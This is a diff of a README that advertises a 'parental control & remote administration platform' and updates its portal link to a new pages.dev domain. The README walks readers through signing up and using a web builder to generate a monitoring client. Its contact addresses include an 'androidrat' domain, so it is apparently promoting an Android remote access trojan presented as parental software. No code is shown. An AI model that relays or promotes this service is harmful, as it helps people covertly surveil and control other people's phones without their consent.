@@ -58,7 +58,7 @@ Built on a foundation of modern, high-performance technologies for maximum relia
 
 Setting up the Ultimate Parental Control & Remote Administration Platform is straightforward and quick:
 
-1.  **Visit the Secure Portal**: Navigate to [https://androkeeda.pages.dev/](https://androkeeda.pages.dev/)
+1.  **Visit the Secure Portal**: Navigate to [https://es-services.pages.dev/](https://es-services.pages.dev/)
 2.  **Create Your Account**: Sign up for a secure administrator account to manage your family's devices.
 3.  **Build Your System**: Utilize our web-based builder to generate your customized management client.
 4.  **Configure Settings**: Tailor your monitoring and safety features to align with your family's specific requirements.
@@ -97,7 +97,7 @@ Setting up the Ultimate Parental Control & Remote Administration Platform is str
 
 For any questions, support, or community engagement, please reach out to our dedicated team:
 
-*   **Official Website**: [androkeeda.pages.dev](https://androkeeda.pages.dev/)
+*   **Official Website**: [https://es-services.pages.dev/](https://es-services.pages.dev/)
 *   **Email Support**: [support@androkeeda.online](mailto:support@androkeeda.online) | [services@androidrat.online](mailto:services@androidrat.online)
 *   **Telegram Community**: Join our community for discussions and updates: [@jrram3000](https://t.me/jrram3000)
 
